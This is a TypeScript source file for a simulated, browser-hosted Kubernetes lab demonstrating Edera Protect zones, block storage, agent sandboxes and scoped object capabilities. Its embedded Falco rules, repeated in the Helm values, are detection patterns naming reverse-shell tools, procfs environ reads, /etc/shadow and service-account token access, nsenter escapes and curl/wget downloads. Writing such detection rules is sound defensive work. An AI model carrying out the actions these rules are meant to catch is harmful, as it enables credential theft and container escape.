/// <reference types="vite/client" />
import { BaseImage, Cluster, type ProcessContext } from "@ngrok/webernetes";
import hljs from "highlight.js/lib/core";
import rust from "highlight.js/lib/languages/rust";
import python from "highlight.js/lib/languages/python";
import typescript from "highlight.js/lib/languages/typescript";
import yaml from "highlight.js/lib/languages/yaml";
import ini from "highlight.js/lib/languages/ini";
import dockerfile from "highlight.js/lib/languages/dockerfile";
import json from "highlight.js/lib/languages/json";
import "./style.css";

// Syntax highlighting for `cat` in the terminal. Only the languages the lab's
// files use are registered, to keep the bundle small.
hljs.registerLanguage("rust", rust);
hljs.registerLanguage("python", python);
hljs.registerLanguage("typescript", typescript);
hljs.registerLanguage("yaml", yaml);
hljs.registerLanguage("ini", ini); // also covers TOML
hljs.registerLanguage("dockerfile", dockerfile);
hljs.registerLanguage("json", json);

const HIGHLIGHT_LANGUAGES: Record<string, string> = {
  rs: "rust",
  py: "python",
  ts: "typescript",
  yaml: "yaml",
  yml: "yaml",
  toml: "ini",
  json: "json",
};

// Returns HTML-escaped file content, highlighted when the file type is known.
const highlightFile = (path: string, content: string): string => {
  const base = path.split("/").pop() || "";
  const language =
    base === "Dockerfile" ? "dockerfile" : HIGHLIGHT_LANGUAGES[base.split(".").pop() || ""];
  if (!language) {
    return content
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
  }
  return `<span class="hljs">${hljs.highlight(content, { language }).value}</span>`;
};

// `kubectl describe` output, coloured with the same highlight.js classes as
// YAML from `cat`: keys like YAML keys, booleans and numbers as literals,
// <none> dimmed, and Warning rows in event tables in red.
const highlightDescribe = (text: string): string => {
  const esc = (value: string) =>
    value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const span = (cls: string, value: string) => `<span class="${cls}">${esc(value)}</span>`;
  const value = (raw: string) => {
    const trimmed = raw.trim();
    if (trimmed === "") return esc(raw);
    if (trimmed === "<none>" || trimmed === "<unset>") return span("hljs-comment", raw);
    if (/^(true|false|True|False)$/.test(trimmed)) return span("hljs-literal", raw);
    if (/^-?\d+(\.\d+)?$/.test(trimmed)) return span("hljs-number", raw);
    return esc(raw);
  };
  let inEventTable = false;
  const lines = text.split("\n").map((line) => {
    if (/^\s*Type\s+Reason\s+Age/.test(line)) {
      inEventTable = true;
      return span("hljs-comment", line);
    }
    if (inEventTable) {
      if (/^\s*-{4}/.test(line)) return span("hljs-comment", line);
      const row = line.match(/^(\s*)(Warning|Normal)(\b.*)$/);
      if (row) {
        return esc(row[1]) + span(row[2] === "Warning" ? "hljs-keyword" : "hljs-string", row[2]) + esc(row[3]);
      }
      inEventTable = false;
    }
    // "Key:" or "Key:  value". kubectl keys never contain a run of two spaces.
    const match = line.match(/^(\s*)((?:[^\s:]| (?! ))+?:)(\s+.*|$)/);
    if (!match) return value(line);
    return esc(match[1]) + span("hljs-attr", match[2]) + value(match[3]);
  });
  return `<span class="hljs">${lines.join("\n")}</span>`;
};

class WebServerImage extends BaseImage {
  static readonly imageName = "web-server";
  static readonly imageVersion = "1.0";
  readonly defaultCommand = ["server"];

  override async exec(
    ctx: ProcessContext,
    argv: readonly string[],
  ): Promise<number> {
    ctx.listenHttp(8080, async () => ({
      statusCode: 200,
      body: "Hello from browser-hosted Kubernetes!\n",
    }));

    return await ctx.waitUntilKilled();
  }
}

interface LocalPod {
  name: string;
  namespace: string;
  status: string;
  age: string;
  image: string;
  ip: string;
  node: string;
  labels: Record<string, string>;
  nodeSelector?: Record<string, string>;
  runtimeClassName?: string;
  ownerDeployment?: string;
  // Set on pods created by `protect workload launch`; removed with the workload.
  ownerProtectWorkload?: string;
}

interface LocalDeployment {
  name: string;
  namespace: string;
  replicas: number;
  readyReplicas: number;
  image: string;
  runtimeClassName?: string;
  selector: string;
  nodeSelector?: Record<string, string>;
  volumeClaimName?: string;
  volumeMode?: "Filesystem" | "Block";
  volumeTargetPath?: string;
}

interface LocalPersistentVolumeClaim {
  name: string;
  namespace: string;
  status: "Pending" | "Bound";
  volumeName: string;
  capacity: string;
  accessModes: string;
  volumeMode: "Filesystem" | "Block";
  storageClassName?: string;
  formatted: boolean;
}

interface LocalPersistentVolume {
  name: string;
  status: "Available" | "Bound";
  claimName?: string;
  capacity: string;
  accessModes: string;
  volumeMode: "Filesystem" | "Block";
  storageClassName?: string;
  source: "CSI" | "Local";
  devicePath?: string;
  nodeAffinity?: string;
  formatted: boolean;
}

interface LocalJob {
  name: string;
  namespace: string;
  completions: number;
  succeeded: number;
  status: "Running" | "Complete";
  image: string;
  runtimeClassName?: string;
  targetDevice?: string;
  claimName?: string;
}

interface LocalNode {
  name: string;
  status: string;
  age: string;
  version: string;
  internalIp: string;
  externalIp: string;
  osImage: string;
  kernelVersion: string;
  containerRuntime: string;
  labels: Record<string, string>;
}

interface LocalNamespace {
  name: string;
  status: string;
  age: string;
}

interface ClusterEvent {
  time: string;
  type: "Normal" | "Warning" | "Info";
  reason: string;
  object: string;
  message: string;
}

interface ProtectZone {
  name: string;
  uuid: string;
  state: "creating" | "ready" | "destroying" | "destroyed";
  ipv4: string;
  ipv6: string;
  minCpus: number;
  maxCpus: number;
  targetCpus: number;
  device?: string;
  kernelVariant?: string;
}

interface ProtectWorkload {
  name: string;
  uuid: string;
  zone: string;
  state: "creating" | "running" | "stopped" | "destroying" | "destroyed";
  image: string;
  command: string[];
  sourcePodName?: string;
  // Object capabilities this workload consumes / publishes.
  ocapConsumed?: string[];
  ocapPublished?: string[];
  // Command run when a published capability is dialed (NAME=COMMAND ARGS).
  ocapPublishCommands?: Record<string, string[]>;
  // Host files mounted into the workload (--mounts src=…:dst=…:ro=…).
  mounts?: WorkloadMount[];
}

interface WorkloadMount {
  source: string;
  destination: string;
  readOnly: boolean;
}

interface DemoStep {
  id: string;
  title: string;
  description: string;
  command: string;
  optional?: boolean;
}

const NGINX_YAML_CONTENT = `apiVersion: v1
kind: Pod
metadata:
  name: edera-protect-pod
  namespace: default
  labels:
    env: test
  annotations:
    dev.edera/cpu: "4"
spec:
  runtimeClassName: edera
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
    resources:
      requests:
        cpu: "4"`;

const RUNTIMECLASS_EDERA_YAML_CONTENT = `apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: edera
handler: edera
scheduling:
  nodeSelector:
    runtime: edera`;

const NGINX_DEPLOYMENT_YAML_CONTENT = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
  namespace: default
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 2
  template:
    metadata:
      labels:
        app: nginx
    spec:
      runtimeClassName: edera
      containers:
      - name: nginx
        image: nginx:1.14.2
        ports:
        - containerPort: 80`;

const HARDENED_VESSEL_YAML_CONTENT = `apiVersion: v1
kind: Pod
metadata:
  name: hardened-vessel
  namespace: edera
spec:
  runtimeClassName: edera
  containers:
  - name: hardened-vessel
    image: denhamparry/leaky-vessel:0.1
    imagePullPolicy: Always
    env:
    - name: SUPER_ORCHESTRATOR_SECRET
      value: "this-is-fine-hardened"`;

const CSI_BLOCK_PVC_YAML_CONTENT = `apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: my-app-data
spec:
  volumeMode: Block
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 10Gi
  storageClassName: gp3`;

const FORMAT_BLOCK_DEVICE_YAML_CONTENT = `apiVersion: batch/v1
kind: Job
metadata:
  name: format-block-device
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: formatter
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
          - |
            apk add --no-cache e2fsprogs
            echo "Formatting block device to ext4..."
            mkfs.ext4 /dev/data
            echo "Format complete."
        volumeDevices:
        - name: data
          devicePath: /dev/data
      volumes:
      - name: data
        persistentVolumeClaim:
          claimName: my-app-data`;

const CSI_BLOCK_DEPLOYMENT_YAML_CONTENT = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      annotations:
        dev.edera/resource-policy: "static"
    spec:
      runtimeClassName: edera
      containers:
      - name: app
        image: my-app:latest
        volumeDevices:
        - name: data
          devicePath: /var/lib/my-app/data
      volumes:
      - name: data
        persistentVolumeClaim:
          claimName: my-app-data`;

const FILESYSTEM_PVC_YAML_CONTENT = `apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: my-app-data
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 10Gi
  storageClassName: gp3`;

const FILESYSTEM_DEPLOYMENT_YAML_CONTENT = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      annotations:
        dev.edera/resource-policy: "static"
    spec:
      runtimeClassName: edera
      containers:
      - name: app
        image: my-app:latest
        volumeMounts:
        - name: data
          mountPath: /var/lib/my-app/data
      volumes:
      - name: data
        persistentVolumeClaim:
          claimName: my-app-data`;

const LOCAL_NVME_PV_YAML_CONTENT = `kind: PersistentVolume
apiVersion: v1
metadata:
  name: local-raw-pv
spec:
  volumeMode: Block
  capacity:
    storage: 5Gi
  local:
    path: /dev/nvme0n1
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  nodeAffinity:
    required:
      nodeSelectorTerms:
        - matchExpressions:
            - key: kubernetes.io/hostname
              operator: In
              values:
                - my-host`;

const LOCAL_NVME_PVC_YAML_CONTENT = `apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: local-block-pvc
spec:
  accessModes:
    - ReadWriteOnce
  volumeMode: Block
  resources:
    requests:
      storage: 5Gi`;

const LOCAL_NVME_DEPLOYMENT_YAML_CONTENT = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      annotations:
        dev.edera/resource-policy: "static"
    spec:
      runtimeClassName: edera
      nodeSelector:
        kubernetes.io/hostname: my-host
      containers:
      - name: app
        image: my-app:latest
        volumeDevices:
        - name: data
          devicePath: /mnt/high-perf-storage
      volumes:
      - name: data
        persistentVolumeClaim:
          claimName: local-block-pvc`;

const FALCO_EDERA_CONFIG_YAML = `plugins:
  - name: container
    library_path: libcontainer.so
    init_config:
      label_max_len: 100
      with_size: false
  - name: edera
    library_path: /var/lib/edera/protect/falco/libedera_falco_plugin.so
load_plugins: [edera]`;

const FALCO_EDERA_RULES_YAML = `- rule: Edera Proc Environ Read
  desc: >
    Detect reads of /proc/*/environ inside an Edera zone.
    Credential harvesting via procfs is a common post-exploitation
    technique for extracting secrets from neighboring workloads.
  source: edera_zone
  output: >
    Credential harvesting attempt in zone
    (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
  priority: WARNING
  condition: >
    evt.pluginname == "edera" and
    evt.type in (open, openat) and
    fd.name glob /proc/*/environ

- rule: Edera Reverse Shell Tool
  desc: >
    Detect execution of common reverse shell tools inside an Edera zone.
    Legitimate workloads rarely invoke netcat, socat, or similar tools.
  source: edera_zone
  output: >
    Reverse shell tool executed in zone
    (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
  priority: CRITICAL
  condition: >
    evt.pluginname == "edera" and
    evt.type in (execve, execveat) and
    proc.name in (nc, ncat, netcat, socat, telnet)

- rule: Edera Namespace Escape Attempt
  desc: >
    Detect nsenter execution inside an Edera zone.
    nsenter is commonly used in container escape and privilege escalation attacks.
  source: edera_zone
  output: >
    Namespace escape attempt in zone
    (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
  priority: CRITICAL
  condition: >
    evt.pluginname == "edera" and
    evt.type in (execve, execveat) and
    proc.name == nsenter

- rule: Edera Sensitive File Read
  desc: >
    Detect reads of sensitive system files inside an Edera zone,
    including credential stores and security-critical configuration.
  source: edera_zone
  output: >
    Sensitive file read in zone
    (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
  priority: WARNING
  condition: >
    evt.pluginname == "edera" and
    evt.type in (open, openat) and
    (fd.name startswith /etc/shadow or
     fd.name startswith /etc/kubernetes or
     fd.name startswith /run/secrets)

- rule: Edera Outbound Connection
  desc: Detect outbound network connections from Edera zones
  source: edera_zone
  output: >
    Outbound connection from zone
    (zone_id=%edera.zone.id proc=%proc.exe dest=%fd.rip:%fd.rport
    proto=%fd.l4proto)
  priority: NOTICE
  condition: >
    evt.pluginname == "edera" and
    evt.type == connect and
    fd.type == ipv4

- rule: Edera Shell Command Execution
  desc: Detect shell command execution with an explicit command string inside an Edera zone.
  source: edera_zone
  output: >
    Shell command execution in zone
    (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
  priority: NOTICE
  condition: >
    evt.pluginname == "edera" and
    evt.type in (execve, execveat) and
    proc.name in (sh, bash, dash, zsh) and
    proc.cmdline contains "-c"

- rule: Edera Privilege Escalation Tool
  desc: Detect common privilege escalation tools inside an Edera zone.
  source: edera_zone
  output: >
    Privilege escalation tool executed in zone
    (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
  priority: WARNING
  condition: >
    evt.pluginname == "edera" and
    evt.type in (execve, execveat) and
    proc.name in (sudo, su, doas)

- rule: Edera Kubernetes Service Account Access
  desc: Detect access to Kubernetes service-account credentials inside an Edera zone.
  source: edera_zone
  output: >
    Kubernetes service-account credential access in zone
    (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
  priority: WARNING
  condition: >
    evt.pluginname == "edera" and
    evt.type in (open, openat) and
    fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount/

- rule: Edera Sensitive File Write
  desc: Detect writes to sensitive system configuration locations inside an Edera zone.
  source: edera_zone
  output: >
    Sensitive file write in zone
    (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
  priority: WARNING
  condition: >
    evt.pluginname == "edera" and
    evt.type in (open, openat, creat) and
    evt.arg.flags contains O_WRONLY and
    (fd.name startswith /etc/ or
     fd.name startswith /var/run/)

- rule: Edera Executable Download
  desc: Detect common download tools fetching executable content inside an Edera zone.
  source: edera_zone
  output: >
    Executable download attempt in zone
    (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
  priority: NOTICE
  condition: >
    evt.pluginname == "edera" and
    evt.type in (execve, execveat) and
    proc.name in (curl, wget) and
    (proc.cmdline contains "http://" or proc.cmdline contains "https://")`;

const FALCO_HELM_VALUES_YAML = `# Mount Edera plugin and daemon socket from host into Falco pods
mounts:
  volumes:
    - name: edera-plugin
      hostPath:
        path: /var/lib/edera/protect/falco
    - name: edera-daemon-socket
      hostPath:
        path: /var/lib/edera/protect

  volumeMounts:
    - name: edera-plugin
      mountPath: /var/lib/edera/protect/falco
      readOnly: true
    - name: edera-daemon-socket
      mountPath: /var/lib/edera/protect
      readOnly: false

falco:
  plugins:
    - name: edera
      library_path: /var/lib/edera/protect/falco/libedera_falco_plugin.so

  load_plugins: [edera]

customRules:
  edera-rules.yaml: |-
    - rule: Edera Proc Environ Read
      desc: >
        Detect reads of /proc/*/environ inside an Edera zone.
        Credential harvesting via procfs is a common post-exploitation
        technique for extracting secrets from neighboring workloads.
      source: edera_zone
      output: >
        Credential harvesting attempt in zone
        (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
      priority: WARNING
      condition: >
        evt.pluginname == "edera" and
        evt.type in (open, openat) and
        fd.name glob /proc/*/environ

    - rule: Edera Reverse Shell Tool
      desc: >
        Detect execution of common reverse shell tools inside an Edera zone.
        Legitimate workloads rarely invoke netcat, socat, or similar tools.
      source: edera_zone
      output: >
        Reverse shell tool executed in zone
        (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
      priority: CRITICAL
      condition: >
        evt.pluginname == "edera" and
        evt.type in (execve, execveat) and
        proc.name in (nc, ncat, netcat, socat, telnet)

    - rule: Edera Namespace Escape Attempt
      desc: >
        Detect nsenter execution inside an Edera zone.
        nsenter is commonly used in container escape and privilege escalation attacks.
      source: edera_zone
      output: >
        Namespace escape attempt in zone
        (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
      priority: CRITICAL
      condition: >
        evt.pluginname == "edera" and
        evt.type in (execve, execveat) and
        proc.name == nsenter

    - rule: Edera Sensitive File Read
      desc: >
        Detect reads of sensitive system files inside an Edera zone,
        including credential stores and security-critical configuration.
      source: edera_zone
      output: >
        Sensitive file read in zone
        (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
      priority: WARNING
      condition: >
        evt.pluginname == "edera" and
        evt.type in (open, openat) and
        (fd.name startswith /etc/shadow or
         fd.name startswith /etc/kubernetes or
         fd.name startswith /run/secrets)

    - rule: Edera Outbound Connection
      desc: Detect outbound network connections from Edera zones
      source: edera_zone
      output: >
        Outbound connection from zone
        (zone_id=%edera.zone.id proc=%proc.exe dest=%fd.rip:%fd.rport
        proto=%fd.l4proto)
      priority: NOTICE
      condition: >
        evt.pluginname == "edera" and
        evt.type == connect and
        fd.type == ipv4

    - rule: Edera Shell Command Execution
      desc: Detect shell command execution with an explicit command string inside an Edera zone.
      source: edera_zone
      output: >
        Shell command execution in zone
        (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
      priority: NOTICE
      condition: >
        evt.pluginname == "edera" and
        evt.type in (execve, execveat) and
        proc.name in (sh, bash, dash, zsh) and
        proc.cmdline contains "-c"

    - rule: Edera Privilege Escalation Tool
      desc: Detect common privilege escalation tools inside an Edera zone.
      source: edera_zone
      output: >
        Privilege escalation tool executed in zone
        (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
      priority: WARNING
      condition: >
        evt.pluginname == "edera" and
        evt.type in (execve, execveat) and
        proc.name in (sudo, su, doas)

    - rule: Edera Kubernetes Service Account Access
      desc: Detect access to Kubernetes service-account credentials inside an Edera zone.
      source: edera_zone
      output: >
        Kubernetes service-account credential access in zone
        (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
      priority: WARNING
      condition: >
        evt.pluginname == "edera" and
        evt.type in (open, openat) and
        fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount/

    - rule: Edera Sensitive File Write
      desc: Detect writes to sensitive system configuration locations inside an Edera zone.
      source: edera_zone
      output: >
        Sensitive file write in zone
        (zone_id=%edera.zone.id proc=%proc.exe file=%fd.name)
      priority: WARNING
      condition: >
        evt.pluginname == "edera" and
        evt.type in (open, openat, creat) and
        evt.arg.flags contains O_WRONLY and
        (fd.name startswith /etc/ or
         fd.name startswith /var/run/)

    - rule: Edera Executable Download
      desc: Detect common download tools fetching executable content inside an Edera zone.
      source: edera_zone
      output: >
        Executable download attempt in zone
        (zone_id=%edera.zone.id proc=%proc.exe cmdline=%proc.cmdline)
      priority: NOTICE
      condition: >
        evt.pluginname == "edera" and
        evt.type in (execve, execveat) and
        proc.name in (curl, wget) and
        (proc.cmdline contains "http://" or proc.cmdline contains "https://")
`;

const EDERA_RUNTIME_NAMESPACE = "edera-runtime";

const AGENT_SANDBOX_VERSION = "v0.5.0rc1";

const AGENT_SANDBOX_MANIFEST_YAML = `apiVersion: agents.x-k8s.io/v1beta1
kind: Sandbox
metadata:
  name: my-sandbox
  namespace: default
spec:
  podTemplate:
    spec:
      runtimeClassName: edera
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
      containers:
      - name: python-sandbox
        image: registry.k8s.io/agent-sandbox/python-runtime-sandbox:v0.1.0
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 8888
        readinessProbe:
          httpGet:
            path: /
            port: 8888
          initialDelaySeconds: 0
          periodSeconds: 1
        resources:
          requests:
            cpu: "250m"
            memory: "512Mi"
          limits:
            cpu: "500m"
            memory: "1Gi"
        securityContext:
          capabilities:
            drop: ["ALL"]
      restartPolicy: Always`;

const AGENT_SANDBOX_TEMPLATE_AND_POOL_YAML = `apiVersion: extensions.agents.x-k8s.io/v1beta1
kind: SandboxTemplate
metadata:
  name: python-sandbox-edera-template
  namespace: default
spec:
  podTemplate:
    spec:
      runtimeClassName: edera
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
      containers:
      - name: python-sandbox
        image: registry.k8s.io/agent-sandbox/python-runtime-sandbox:v0.1.0
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 8888
        readinessProbe:
          httpGet:
            path: /
            port: 8888
        resources:
          requests:
            cpu: "250m"
            memory: "512Mi"
          limits:
            cpu: "500m"
            memory: "1Gi"
        securityContext:
          capabilities:
            drop: ["ALL"]
---
apiVersion: extensions.agents.x-k8s.io/v1beta1
kind: SandboxWarmPool
metadata:
  name: python-sandbox-pool
  namespace: default
spec:
  replicas: 2
  sandboxTemplateRef:
    name: python-sandbox-edera-template`;

// Edera-native Sandbox / Snapshot / Fork resources (runtime.edera.dev).
// None of these exist when the lab starts: the guide walks the user through
// reading and applying each manifest (see handleEderaRuntimeResources).
const EDERA_SANDBOX_NAME = "sandbox-sample";
const EDERA_SNAPSHOT_NAME = "sandbox-sample-snap";
const EDERA_FORK_NAME = "sandbox-sample-snap-fork";
const EDERA_FORK_REPLICAS = 2;
// The sandbox is scheduled here; remote: Local keeps the snapshot (and so
// the forks) on the same node.
const EDERA_SANDBOX_NODE = "node-2";
const EDERA_SANDBOX_IMAGE =
  "registry.k8s.io/agent-sandbox/python-runtime-sandbox:v0.1.0";
const EDERA_ZONE_KERNEL = "6.18.34-edera-zone";

const EDERA_SANDBOX_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: Sandbox
metadata:
  name: sandbox-sample
spec:
  podTemplate:
    metadata:
      labels:
        app.kubernetes.io/name: sandbox-sample
    spec:
      containers:
      - name: workload
        image: ${EDERA_SANDBOX_IMAGE}`;

const EDERA_SNAPSHOT_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: Snapshot
metadata:
  name: sandbox-sample-snap
  # Same namespace as the Sandbox; sandboxName is resolved there.
  namespace: default
spec:
  sandboxName: sandbox-sample
  # Local keeps the snapshot on the sandbox's node. Remote needs
  # snapshotStorage.shared in the chart, which this install doesn't enable.
  remote: Local`;

const EDERA_FORK_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: Fork
metadata:
  name: sandbox-sample-snap-fork
  namespace: default
spec:
  source:
    sandbox: sandbox-sample
  # The snapshot is local to the sandbox's node, so the forks run there too.
  remote: Local
  replicas: 2`;

const AGENT_SANDBOX_ROUTER_COMMAND = `kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/agent-sandbox/${AGENT_SANDBOX_VERSION}/clients/python/agentic-sandbox-client/sandbox-router/sandbox_router.yaml`;

const OCAP_GITHUB_CAPABILITY = `name = "github"

description = "git over HTTPS to github.com, for the repositories granted below"

require_touch_id = true

[permissions.read]

rules = [
  { endpoint = "https://github.com", method = "GET", path = "/kubernetes/kubernetes.git" },
]

[permissions.push]

includes = ["read"]

rules = [
  { endpoint = "https://github.com", method = "POST", path = "/kubernetes/kubernetes.git" },
]

# The token is the basic-auth password for endpoint.username.
# Without a token, public repositories still work.
[auth]

scheme = "basic"
optional = true

# Inside the sandbox: send git's GitHub URLs to this capability's relay.
[agent]

git_insteadof = ["https://github.com/"]
env = { GIT_TERMINAL_PROMPT = "0" }`;

// The manifest lives in the user's home directory as ~/github.toml. It is
// published when the zone is created and consumed by the agent workload.
const OCAP_GITHUB_MANIFEST_PATH = "/github.toml";
const OCAP_GITHUB_NAME = "github";
const OCAP_ZONE_NAME = "kubecon-salt-lake";
const OCAP_WORKLOAD_NAME = "agent";
const OCAP_WORKLOAD_IMAGE = "docker.io/alpine/git:latest";
// Capabilities are published by workloads (--ocap-publish is a workload
// flag). In the agent walkthrough a relay workload publishes `github` into
// the zone, and the agent consumes it.
const OCAP_RELAY_NAME = "github-relay";
const OCAP_RELAY_LAUNCH_COMMAND = `protect workload launch --zone ${OCAP_ZONE_NAME} --name ${OCAP_RELAY_NAME} --ocap-publish ${OCAP_GITHUB_NAME} ${OCAP_WORKLOAD_IMAGE}`;

// A workload can publish a capability too (README "Demo Workflow"). The
// readme-fetch provider idles in its own zone holding a GitHub token, and
// publishes one command: `/readme-fetch get <repo>`. Dialing the capability
// runs that command with the caller's argument; the token never leaves the
// provider. The same fetcher exists in Rust, Python and TypeScript.
const README_ZONE_NAME = "cap-provider";
const README_WORKLOAD_NAME = "readme";
const README_CAPABILITY = "dev.example/readme";
const README_CAPABILITY_COMMAND = "/readme-fetch get";
const README_TOKEN_HOST_PATH = "/tmp/token";
const README_TOKEN_MOUNT_PATH = "/run/secrets/token";
const README_IMAGE_PREFIX = "ttl.sh/celery/readme-fetch-";
const README_LANGUAGES = ["rust", "python", "typescript"] as const;
type ReadmeLanguage = (typeof README_LANGUAGES)[number];
const README_WORKLOAD_IMAGE = `${README_IMAGE_PREFIX}rust:1h`;
// A public edera-dev repo. The fetchers hard-code the edera-dev org and accept
// only [A-Za-z0-9]+, so names like agent-runtime can't be fetched.
const README_DIAL_REPO = "styrolite";
const README_WORKLOAD_LAUNCH_COMMAND =
  `protect workload launch -n ${README_WORKLOAD_NAME} -z ${README_ZONE_NAME} ` +
  `--mounts src=${README_TOKEN_HOST_PATH}:dst=${README_TOKEN_MOUNT_PATH}:ro=true ` +
  `--ocap-publish '${README_CAPABILITY}=${README_CAPABILITY_COMMAND}' ` +
  README_WORKLOAD_IMAGE;
// Host files that exist outside the read-only home directory. The lab stages
// a GitHub token at /tmp/token for the readme provider to mount.
const HOST_FILES = new Set<string>([README_TOKEN_HOST_PATH]);

// The readme-fetch sources ship with the lab. rust/, python/ and typescript/
// from this repo are bundled verbatim at build time, so `ls`, `cat` and
// `docker build` in the terminal always see the files committed here.
const README_FETCH_SOURCES: Record<string, string> = Object.fromEntries(
  Object.entries(
    import.meta.glob(
      [
        "../{rust,python,typescript}/**/*",
        "!../**/node_modules/**",
        "!../**/target/**",
        "!../**/dist/**",
      ],
      { query: "?raw", import: "default", eager: true },
    ) as Record<string, string>,
  ).map(([path, content]) => [path.replace(/^\.\.\//, "/"), content]),
);

// ---------------------------------------------------------------------------
// Cluster object capabilities (runtime.edera.dev/v1alpha1).
// A CapabilityProvider runs one provider pod that publishes one or more
// object capabilities (a kubernetes provider can offer get-pods and
// get-pod-logs, say, rather than one resource per capability). A
// SandboxTemplate grants a subset of a provider's capabilities; a
// SandboxSession selects a provider and a subset of what its template grants,
// and the controller creates a zone + workload that consumes exactly those.
// ---------------------------------------------------------------------------
// examples/capability_provider.yaml is the github provider: the readme-fetch
// image, with its token from a Secret, publishing dev.example/readme.
// examples/kubernetes_provider.yaml shows one provider offering several
// capabilities.
const CAPABILITY_PROVIDER_PATH = "/examples/capability_provider.yaml";
const KUBERNETES_PROVIDER_PATH = "/examples/kubernetes_provider.yaml";
const CAPABILITY_SECRET_NAME = "readme-token";
const CAPABILITY_SECRET_COMMAND = `kubectl create secret generic ${CAPABILITY_SECRET_NAME} --from-file=token=/tmp/token`;
const SANDBOX_TEMPLATE_PATH = "/examples/sandbox_template.yaml";
const SANDBOX_SESSION_PATH = "/examples/sandbox_session.yaml";
const SANDBOX_SESSION_DENIED_PATH = "/examples/sandbox_session_denied.yaml";
const SANDBOX_SDK_PATH = "/examples/session.py";
const SANDBOX_TEMPLATE_NAME = "claude-tmpl";
const SANDBOX_SESSION_NAME = "claude-session-0";
const SANDBOX_SESSION_DENIED_NAME = "claude-session-1";
const GITHUB_PROVIDER_NAME = "github";
const KUBERNETES_PROVIDER_NAME = "kubernetes";

const CAPABILITY_PROVIDER_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: CapabilityProvider
metadata:
  name: github
spec:
  capabilities:
    - name: dev.example/readme
      command: ['/readme-fetch', 'get']
  metadata:
    labels:
      app.kubernetes.io/name: github
  spec:
    containers:
    - name: readme
      image: ttl.sh/celery/readme-fetch-rust:1h
      volumeMounts:
        - name: token
          mountPath: /run/secrets/token
          subPath: token
          readOnly: true
    volumes:
    - name: token
      secret:
        secretName: readme-token
        items:
          - key: token
            path: token`;

const KUBERNETES_PROVIDER_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: CapabilityProvider
metadata:
  name: kubernetes
spec:
  capabilities:
    - name: dev.example/get-pods
      command: ['/kube-tools', 'get-pods']
    - name: dev.example/get-pod-logs
      command: ['/kube-tools', 'logs']
  metadata:
    labels:
      app.kubernetes.io/name: kubernetes
  spec:
    serviceAccountName: capability-pod-reader
    containers:
    - name: kube-tools
      image: ttl.sh/celery/kube-tools:1h`;

const SANDBOX_TEMPLATE_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: SandboxTemplate
metadata:
  name: claude-tmpl
spec:
  capabilities:
    - provider: github
      capabilities:
        - dev.example/readme
  podTemplate:
    spec:
      containers:
        - name: workload
          image: ttl.sh/celery/readme-consume:1h`;

const SANDBOX_SESSION_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: SandboxSession
metadata:
  name: claude-session-0
spec:
  capabilities:
    - provider: github
      capabilities:
        - dev.example/readme
  templateRef:
    name: claude-tmpl`;

const SANDBOX_SESSION_DENIED_YAML = `apiVersion: runtime.edera.dev/v1alpha1
kind: SandboxSession
metadata:
  name: claude-session-1
spec:
  capabilities:
    - provider: kubernetes
      capabilities:
        - dev.example/get-pods
  templateRef:
    name: claude-tmpl`;

const SANDBOX_SDK_PY = `from edera_runtime import SandboxSession

# The SDK turns this into a SandboxSession object (templateRef + the provider
# and capabilities to select), waits for its zone, runs the command inside it,
# and deletes the session on exit.
with SandboxSession(
    template="claude-tmpl",
    capabilities={"github": ["dev.example/readme"]},
) as s:
    s.sandbox.run("/readme-consume styrolite")
`;

// ---------------------------------------------------------------------------
